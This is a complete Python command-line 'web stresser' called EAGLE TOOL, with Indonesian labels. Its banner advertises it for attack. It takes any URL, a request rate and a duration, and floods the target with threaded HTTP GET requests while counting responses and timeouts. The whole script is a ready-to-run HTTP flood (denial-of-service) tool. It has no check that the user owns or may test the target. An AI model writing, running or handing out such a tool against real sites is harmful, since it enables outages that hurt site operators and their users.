#!/usr/bin/env python3

import sys
import time
import threading
import requests
from datetime import datetime

# Warna
merah = '\033[91m'
hijau = '\033[92m'
kuning = '\033[93m'
biru = '\033[94m'
ungu = '\033[95m'
cyan = '\033[96m'
putih = '\033[97m'
nc = '\033[0m'
bold = '\033[1m'

# Banner EAGLE TOOL
def banner():
    print(bold + cyan)
    print("╔═════════════════════════════════════════════════════╗") 
    print("         ░█▀▀░█▀█░█▀▀░█░░░█▀▀░░░▀█▀░█▀█░█▀█░█░░░█▀▀               ")
    print("         ░█▀▀░█▀█░█░█░█░░░█▀▀░░░░█░░█░█░█░█░█░░░▀▀█               ")
    print("         ░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀▀▀░░░░▀░░▀▀▀░▀▀▀░▀▀▀░▀▀▀             ")
    print("      STRESSER WEB FOR CYBER POEPLE ATTACK                                  ")
    print("╚═════════════════════════════════════════════════════╝")
    print(nc)

# Animasi loading
def loading():
    print(kuning + "[!] Initializing EAGLE TOOL...", end="")
    for i in range(3):
        time.sleep(0.3)
        print(".", end="", flush=True)
    print(nc)

# Stress test function
def stress_test(target, req_per_detik, durasi):
    sukses = 0
    gagal = 0
    timeout = 0
    hitungan = 0
    end_time = time.time() + durasi
    lock = threading.Lock()
    
    def make_request():
        nonlocal sukses, gagal, timeout, hitungan
        with lock:
            hitungan += 1
            no = hitungan
        
        try:
            start = time.time()
            response = requests.get(target, timeout=5, allow_redirects=True)
            waktu = int((time.time() - start) * 1000)
            
            if response.status_code in [200, 301, 302, 304]:
                with lock:
                    sukses += 1
                print(hijau + f"[✓] Req #{no} | HTTP {response.status_code} | {waktu}ms" + nc)
            elif response.status_code in [400, 401, 403, 404, 500, 502, 503, 508]:
                with lock:
                    gagal += 1
                print(merah + f"[✗] Req #{no} | HTTP {response.status_code} | {waktu}ms" + nc)
            else:
                with lock:
                    gagal += 1
                print(kuning + f"[?] Req #{no} | HTTP {response.status_code} | {waktu}ms" + nc)
                
        except requests.exceptions.Timeout:
            with lock:
                timeout += 1
            print(kuning + f"[?] Req #{no} | TIMEOUT" + nc)
        except Exception as e:
            with lock:
                gagal += 1
            print(merah + f"[✗] Req #{no} | ERROR: {str(e)[:30]}" + nc)
    
    while time.time() < end_time:
        start_second = time.time()
        threads = []
        
        for _ in range(req_per_detik):
            t = threading.Thread(target=make_request)
            t.start()
            threads.append(t)
            time.sleep(1/req_per_detik)
        
        for t in threads:
            t.join()
        
        elapsed = time.time() - start_second
        print(cyan + f"━━━━━━━━━━━━━━━━━━━━━ [ {datetime.now().strftime('%H:%M:%S')} ] ━━━" + nc)
        
        if elapsed < 1:
            time.sleep(1 - elapsed)
    
    return sukses, gagal, timeout, hitungan

def main():
    banner()
    
    print(cyan + "──────────────────────────────────────────────────────────────────────" + nc)
    print(putih + "              EAGLE TOOL - STRESS TESTER WEBSITE" + nc)
    print(cyan + "──────────────────────────────────────────────────────────────────────" + nc)
    print()
    
    # Input target
    print(biru + "[?] URL target (https://example.com)" + nc)
    target = input("➤ ").strip()
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    print(biru + "[?] Request per detik:" + nc)
    try:
        req_detik = int(input("➤ ").strip())
    except ValueError:
        print(merah + "[!] Harus angka!" + nc)
        sys.exit(1)
    
    print(biru + "[?] Durasi  (detik):" + nc)
    try:
        durasi = int(input("➤ ").strip())
    except ValueError:
        print(merah + "[!] Harus angka!" + nc)
        sys.exit(1)
    
    print()
    print(kuning + "──────────────────────────────────────────────────────────────────────" + nc)
    print(kuning + "  🦅  EAGLE TOOL - INITIALIZING STRESS TEST...                    " + nc)
    
    target_display = target[:50] + "..." if len(target) > 50 else target
    print(kuning + f"  📡  Target: {target_display}" + " " * (55 - len(target_display)) + nc)
    
    print(kuning + f"  ⚡  Request/Detik: {req_detik}  |  Durasi: {durasi} detik        " + nc)
    loading()
    print(kuning + f"  ✅  EAGLE READY!                                            " + nc)
    print(kuning + "──────────────────────────────────────────────────────────────────────" + nc)
    print(merah + "[!] Tekan CTRL+C untuk berhenti" + nc)
    print()
    
    total_request = req_detik * durasi
    
    try:
        sukses, gagal, timeout, total = stress_test(target, req_detik, durasi)
        
        print()
        print(hijau + "──────────────────────────────────────────────────────────────────────" + nc)
        print(hijau + "  🎯  EAGLE TOOL - STRESS TEST COMPLETED!                        " + nc)
        print(hijau + "──────────────────────────────────────────────────────────────────────" + nc)
        print(hijau + f"  ✅  Sukses   : {sukses}" + " " * (50 - len(str(sukses))) + nc)
        print(hijau + f"  ❌  Gagal    : {gagal}" + " " * (50 - len(str(gagal))) + nc)
        print(hijau + f"  ⏰  Timeout  : {timeout}" + " " * (50 - len(str(timeout))) + nc)
        print(hijau + f"  📊  Total    : {total}" + " " * (50 - len(str(total))) + nc)
        print(hijau + "──────────────────────────────────────────────────────────────────────" + nc)
        print(hijau + "  ⚠️   PERBANYAK IBADAH, KURANGI DRAMA            " + nc)
        print(hijau + "  🛡️  JALANI, NIKMATI, SYUKURI PLUS TAU DIRI                   " + nc)
        print(hijau + "──────────────────────────────────────────────────────────────────────" + nc)
        
    except KeyboardInterrupt:
        print()
        print(kuning + "\n[!] EAGLE TOOL dihentikan oleh user!" + nc)
        sys.exit(0)

if __name__ == "__main__":
    main()

    
